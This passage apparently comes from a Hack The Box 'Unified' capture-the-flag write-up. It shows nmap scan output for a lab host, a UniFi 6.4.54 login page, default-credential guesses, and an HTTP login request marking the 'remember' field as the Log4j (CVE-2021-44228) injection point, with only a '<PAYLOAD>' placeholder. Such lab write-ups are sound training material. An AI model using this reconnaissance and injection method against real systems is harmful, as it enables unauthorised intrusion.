+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;</span><span class="n">style</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span><span class="o">&gt;</span><span class="n">body</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">white</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">22</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">16</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">14</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">12</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">black</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="p">.</span><span class="n">line</span><span class="w"> </span><span class="err">{</span><span class="n">height</span><span class="p">:</span><span class="mi">1</span><span class="n">px</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="n">border</span><span class="p">:</span><span class="k">none</span><span class="p">;</span><span class="err">}</span><span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">Socks5</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="nb">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">435</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">57</span><span class="w"> </span><span class="n">GMT</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">doctype</span><span class="w"> </span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;</span><span class="n">style</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span><span class="o">&gt;</span><span class="n">body</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">white</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">22</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">16</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">14</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">12</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">black</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="p">.</span><span class="n">line</span><span class="w"> </span><span class="err">{</span><span class="n">height</span><span class="p">:</span><span class="mi">1</span><span class="n">px</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="n">border</span><span class="p">:</span><span class="k">none</span><span class="p">;</span><span class="err">}</span><span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">redirect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">96</span><span class="p">.</span><span class="mi">149</span><span class="p">:</span><span class="mi">8443</span><span class="o">/</span><span class="n">manage</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="k">open</span><span class="o">-</span><span class="n">proxy</span><span class="p">:</span><span class="w"> </span><span class="n">Proxy</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">redirecting</span><span class="w"> </span><span class="n">requests</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">8443</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">nagios</span><span class="o">-</span><span class="n">nsca</span><span class="w"> </span><span class="n">Nagios</span><span class="w"> </span><span class="n">NSCA</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">UniFi</span><span class="w"> </span><span class="n">Network</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Requested</span><span class="w"> </span><span class="n">resource</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">account</span><span class="o">/</span><span class="n">login</span><span class="o">?</span><span class="n">redirect</span><span class="o">=%</span><span class="mi">2</span><span class="n">Fmanage</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">UniFi</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Ubiquiti</span><span class="w"> </span><span class="n">Inc</span><span class="p">.</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="k">New</span><span class="w"> </span><span class="n">York</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">US</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Subject</span><span class="w"> </span><span class="n">Alternative</span><span class="w"> </span><span class="n">Name</span><span class="p">:</span><span class="w"> </span><span class="n">DNS</span><span class="p">:</span><span class="n">UniFi</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span><span class="n">T21</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">24</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2024</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span><span class="n">T21</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">24</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">unrecognized</span><span class="w"> </span><span class="n">despite</span><span class="w"> </span><span class="n">returning</span><span class="w"> </span><span class="k">data</span><span class="p">.</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">service</span><span class="o">/</span><span class="k">version</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">submit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="n">cgi</span><span class="o">?</span><span class="k">new</span><span class="o">-</span><span class="n">service</span><span class="w"> </span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="o">-</span><span class="n">Port8080</span><span class="o">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mi">7</span><span class="p">.</span><span class="mi">92</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">2</span><span class="o">/</span><span class="mi">18</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mi">620</span><span class="n">F2A45</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Ge</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">tRequest</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:2005:21:56\x20GMT\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">HTTPOptions</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="s2">&#34;H
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:tent-Length:\x200\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x2005:21:56\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:GMT\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">RTSPRequest</span><span class="p">,</span><span class="mi">24</span><span class="n">E</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\x204
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Fri,\x2018\x20Feb\x202022\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x2005:21:56\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;ht
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ml\x20lang=\&#34;</span><span class="n">en</span><span class="err">\</span><span class="s2">&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&#34;</span><span class="nb">text</span><span class="o">/</span><span class="n">css</span><span class="err">\</span><span class="s2">&#34;&gt;body\x20{font-family
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:one;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">FourOhFourRequest</span><span class="p">,</span><span class="mi">24</span><span class="n">A</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Fri,\x2018\x20Feb\x202
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:022\x2005:21:57\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:&gt;&lt;html\x20lang=\&#34;</span><span class="n">en</span><span class="err">\</span><span class="s2">&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20404\x20\xe2\x80\x9
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:3\x20Not\x20Found&lt;/title&gt;&lt;style\x20type=\&#34;</span><span class="nb">text</span><span class="o">/</span><span class="n">css</span><span class="err">\</span><span class="s2">&#34;&gt;body\x20{font-fami
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF::none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20404\x20\xe2\x80\x93\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20Not\x20Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Socks5</span><span class="p">,</span><span class="mi">24</span><span class="n">E</span><span class="p">,</span><span class="s2">&#34;HTTP/1\.1\x20400\x20\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:r\nContent-Length:\x20435\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x2005:2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:1:57\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20l
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ang=\&#34;</span><span class="n">en</span><span class="err">\</span><span class="s2">&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0Request&lt;/title&gt;&lt;style\x20type=\&#34;</span><span class="nb">text</span><span class="o">/</span><span class="n">css</span><span class="err">\</span><span class="s2">&#34;&gt;body\x20{font-family:Tahoma
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}&lt;/
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">25</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 187.03 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="port-8080">port 8080</h2>
+<p>The Nmap scan result shows <code>port 8080</code> is open. It is the <code>http-proxy</code> let&rsquo;s navigate to the port. However, it redirects me to this link
+<code>https://10.129.96.149:8443/manage/account/login?redirect=%2Fmanage</code></p>
+<h2 id="unifi---6454">unifi - 6.4.54</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/unifi-login-page.png"
+        data-srcset="/posts/htb/unified/unifi-login-page.png, /posts/htb/unified/unifi-login-page.png 1.5x, /posts/htb/unified/unifi-login-page.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/unifi-login-page.png"
+        title="1" width="864" height="634" /></p>
+<p>Well, it is just a login page. The first thing I do is try to put some simple credentials such as <code>admin:admin</code>, <code>admin:password</code>, etc. Unfortunately, I can&rsquo;t get access to it but this page also has the version displayed in front of it.</p>
+<p>With quick googling, I have found this. <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi" target="_blank" rel="noopener noreffer ">sprocketsecurity - another log4j on the fire unifi</a>. Turns out this version, is on fire with the new vulnerability from the java logging library, Log4j - <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener noreffer ">CVE-2021-44228</a></p>
+<h2 id="exploit">exploit</h2>
+<p>In the article, it says:
+The vulnerability is in the <code>remember</code> (or in some versions the <code>username</code>) value issued in the login request. shown below:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">&lt;TARGET&gt; </span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">109</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Ch-Ua</span><span class="o">:</span> <span class="l">&#34; Not A;Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;96&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Ch-Ua-Mobile</span><span class="o">:</span> <span class="l">?0</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Ch-Ua-Platform</span><span class="o">:</span> <span class="l">&#34;macOS&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">https://&lt;TARGET&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">https://&lt;TARGET&gt;/manage/account/login?redirect=%2Fmanage</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;asdf&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;asdfas&#34;</span><span class="p">,</span><span class="nt">&#34;remember&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;PAYLOAD&gt;&#34;</span><span class="p">,</span><span class="nt">&#34;strict&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="how-to-test-it-is-vulnerable-to-log4j">how to test it is vulnerable to log4j</h2>
+<p>I find a way easier method to test it in the <code>official walkthrough</code> that you can download. Does it mean I&rsquo;m not trying it and just reading it? Well, if you have that perception. Here is the blog post talking about that.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/unified/htb-blog-writeup-is-ok.png"
+        data-srcset="/posts/htb/unified/htb-blog-writeup-is-ok.png, /posts/htb/unified/htb-blog-writeup-is-ok.png 1.5x, /posts/htb/unified/htb-blog-writeup-is-ok.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/unified/htb-blog-writeup-is-ok.png"
+        title="1" width="666" height="374" /></p>
